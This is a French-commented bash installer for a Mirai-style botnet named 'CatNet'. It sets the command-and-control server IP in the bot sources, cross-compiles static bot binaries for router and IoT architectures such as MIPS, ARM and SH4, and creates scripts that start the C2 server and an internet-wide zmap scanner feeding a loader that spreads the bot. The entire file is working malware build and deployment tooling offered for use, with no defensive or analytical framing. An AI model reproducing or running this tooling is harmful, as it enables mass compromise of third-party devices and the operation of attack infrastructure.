#!/bin/bash

# CatNet Botnet - Script d'installation automatique
# Ce script configure et compile tous les composants du botnet

# Couleurs pour une meilleure lisibilité
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}╔════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║            CATNET BOTNET INSTALLER             ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════╝${NC}"

# Vérifier si l'utilisateur est root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] Ce script doit être exécuté en tant que root${NC}"
  exit 1
fi

# Demander l'adresse IP du serveur C2
echo -e "${YELLOW}[?] Entrez l'adresse IP de votre serveur C2:${NC}"
read C2_IP

# Valider l'adresse IP
if [[ ! $C2_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo -e "${RED}[!] Adresse IP invalide${NC}"
  exit 1
fi

echo -e "${GREEN}[+] Configuration du serveur C2: $C2_IP${NC}"

# Installer les dépendances
echo -e "${YELLOW}[*] Installation des dépendances...${NC}"
apt update
apt install -y golang zmap gcc-multilib libc6-dev-i386 linux-libc-dev:i386 \
  gcc-mips-linux-gnu gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu \
  gcc-powerpc-linux-gnu gcc-sh4-linux-gnu gcc-m68k-linux-gnu \
  gcc-sparc64-linux-gnu \
  libc6-dev-mips-cross libc6-dev-arm-cross libc6-dev-arm64-cross \
  libc6-dev-powerpc-cross libc6-dev-sh4-cross libc6-dev-m68k-cross \
  libc6-dev-sparc64-cross \
  screen

# Créer les liens symboliques pour résoudre l'erreur asm/socket.h
echo -e "${YELLOW}[*] Configuration des liens symboliques pour les headers...${NC}"

# Pour x86 32-bit
mkdir -p /usr/i386-linux-gnu/include
ln -sf /usr/include/asm-generic /usr/i386-linux-gnu/include/asm

# Pour MIPS
mkdir -p /usr/mips-linux-gnu/include
ln -sf /usr/include/asm-generic /usr/mips-linux-gnu/include/asm

# Pour ARM
mkdir -p /usr/arm-linux-gnueabi/include
ln -sf /usr/include/asm-generic /usr/arm-linux-gnueabi/include/asm

# Pour ARM64
mkdir -p /usr/aarch64-linux-gnu/include
ln -sf /usr/include/asm-generic /usr/aarch64-linux-gnu/include/asm

# Pour PowerPC
mkdir -p /usr/powerpc-linux-gnu/include
ln -sf /usr/include/asm-generic /usr/powerpc-linux-gnu/include/asm

# Pour SH4
mkdir -p /usr/sh4-linux-gnu/include
ln -sf /usr/include/asm-generic /usr/sh4-linux-gnu/include/asm

# Pour M68K
mkdir -p /usr/m68k-linux-gnu/include
ln -sf /usr/include/asm-generic /usr/m68k-linux-gnu/include/asm

# Pour SPARC
mkdir -p /usr/sparc64-linux-gnu/include
ln -sf /usr/include/asm-generic /usr/sparc64-linux-gnu/include/asm

# Mettre à jour l'adresse IP dans fiber.go
echo -e "${YELLOW}[*] Configuration de fiber.go avec l'adresse IP du C2...${NC}"
sed -i "s/c2ServerIP = \".*\"/c2ServerIP = \"$C2_IP\"/g" fiber.go

# Mettre à jour l'adresse IP dans bot.c
echo -e "${YELLOW}[*] Configuration de bot.c avec l'adresse IP du C2...${NC}"
sed -i "s/#define C2_SERVER \".*\"/#define C2_SERVER \"$C2_IP\"/g" bot.c

# Compiler fiber.go
echo -e "${YELLOW}[*] Compilation de fiber.go...${NC}"
go build -o fiber fiber.go
chmod +x fiber

# Compiler bot.c pour différentes architectures
echo -e "${YELLOW}[*] Compilation de bot.c pour différentes architectures...${NC}"

# MIPS (routeurs courants)
echo -e "${BLUE}[*] Compilation pour MIPS...${NC}"
mips-linux-gnu-gcc -static -o bot.mips bot.c -D__MIPS__

# ARM (IoT, routeurs)
echo -e "${BLUE}[*] Compilation pour ARM...${NC}"
arm-linux-gnueabi-gcc -static -o bot.arm bot.c -D__ARM__

# ARM64 (appareils modernes)
echo -e "${BLUE}[*] Compilation pour ARM64...${NC}"
aarch64-linux-gnu-gcc -static -o bot.arm7 bot.c -D__ARM__

# x86 (ordinateurs 32-bit)
echo -e "${BLUE}[*] Compilation pour x86...${NC}"
gcc -m32 -static -o bot.x86 bot.c

# x86_64 (ordinateurs 64-bit)
echo -e "${BLUE}[*] Compilation pour x86_64...${NC}"
gcc -static -o bot.x86_64 bot.c

# PowerPC
echo -e "${BLUE}[*] Compilation pour PowerPC...${NC}"
powerpc-linux-gnu-gcc -static -o bot.ppc bot.c -D__PPC__

# SH4 (anciens appareils embarqués)
echo -e "${BLUE}[*] Compilation pour SH4...${NC}"
sh4-linux-gnu-gcc -static -o bot.sh4 bot.c

# M68K (anciens systèmes)
echo -e "${BLUE}[*] Compilation pour M68K...${NC}"
m68k-linux-gnu-gcc -static -o bot.m68k bot.c

# SPARC (serveurs)
echo -e "${BLUE}[*] Compilation pour SPARC...${NC}"
sparc64-linux-gnu-gcc -static -o bot.sparc bot.c -D__SPARC__

# Vérifier les binaires compilés
echo -e "${YELLOW}[*] Vérification des binaires compilés...${NC}"
echo -e "${GREEN}[+] Binaires disponibles:${NC}"
for arch in mips arm arm7 x86 x86_64 ppc sh4 m68k sparc; do
  if [ -f "bot.$arch" ]; then
    size=$(du -h "bot.$arch" | cut -f1)
    echo -e "    - bot.$arch ($size)"
  else
    echo -e "${RED}[!] bot.$arch n'a pas été compilé correctement${NC}"
  fi
done

# Créer un script de démarrage pour le C2
echo -e "${YELLOW}[*] Création du script de démarrage...${NC}"
cat > start_c2.sh << 'EOL'
#!/bin/bash
echo "Démarrage du serveur C2..."
screen -dmS c2_server python3 simple_c2.py
echo "Serveur C2 démarré dans screen. Pour s'y connecter: screen -r c2_server"
EOL
chmod +x start_c2.sh

# Créer un script de démarrage pour le scanner
cat > start_scanner.sh << 'EOL'
#!/bin/bash
if [ $# -ne 1 ]; then
  echo "Usage: $0 <port>"
  echo "Exemple: $0 80"
  exit 1
fi

PORT=$1
echo "Démarrage du scanner sur le port $PORT..."
screen -dmS scanner_$PORT bash -c "ulimit -n 999999; ulimit -u999999; zmap -p$PORT -w all.lst -q | ./fiber $PORT"
echo "Scanner démarré dans screen. Pour s'y connecter: screen -r scanner_$PORT"
EOL
chmod +x start_scanner.sh

echo -e "${GREEN}[+] Installation terminée!${NC}"
echo -e "${YELLOW}[*] Pour démarrer le serveur C2:${NC} ./start_c2.sh"
echo -e "${YELLOW}[*] Pour démarrer le scanner:${NC} ./start_scanner.sh <port>"
echo -e "${YELLOW}[*] Exemple:${NC} ./start_scanner.sh 80"
echo -e "${BLUE}[*] Pour voir les sessions screen:${NC} screen -ls"
echo -e "${BLUE}[*] Pour se connecter à une session:${NC} screen -r <nom_session>"
echo -e "${BLUE}[*] Pour quitter une session sans la fermer:${NC} Ctrl+A puis D"
